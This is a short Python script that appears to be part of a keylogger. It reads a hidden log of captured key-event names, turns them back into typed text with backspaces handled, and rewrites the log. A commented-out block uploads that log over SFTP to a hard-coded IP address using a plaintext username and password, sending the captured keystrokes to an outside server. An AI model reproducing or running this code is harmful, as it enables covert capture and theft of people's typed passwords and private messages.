import pysftp

log_path = './.file.log'

log = ''

keys = {
    'space'       : ' ',
    'at'          : '@',
    'period'      : '.',
    'exclam'      : '!',
    'Return'      : '\n',
    'minus'       : '-',
    'equal' 	  : '=',
    'numbersign'  : '#',
    'dollar'      : '$',
    'percent'     : '%',
    'asciicircum' : '^',
    'ampersand'   : '&',
    'asterisk'    : '*',
    'parenleft'   : '(',
    'parenright'  : ')',
    'underscore'  : '_',
    'plus'        : '+',
    'bracketleft' : '[',
    'bracketright': ']',
    'braceleft'   : '{',
    'braceright'  : '}',
    'bar'	  : '|',
    'colon'	  : ':',
    'quotedbl'	  : '"',
    'less'        : '<',
    'greater'     : '>',
    'question'    : '?',
    'comma'       : ',',
    'semicolon'   : ';',
    'apostrophe'  : "'",
    'backslash'   : '\\',
    'slash'       : '/',
    'asciitilde'  : '~'
}

with open(log_path, 'r') as log_file:
    
    for event in log_file:

        for word in event.split():

            if word == 'BackSpace':
                log = log[0:-1]
            
            elif word in keys:
                log += keys[word]

            elif len(word) is 1:
                log += word

log_file.close()

log_file = open(log_path, 'w')
log_file.write(log)
log_file.close()

#with pysftp.Connection(host = '104.48.151.49', username = 'sftpjohn', password = 'QualityPass123Word!') as sftp:
#    with sftp.cd('Jonathan'):
#        sftp.put('./.file.log') # uploads the log to server
#sftp.close()
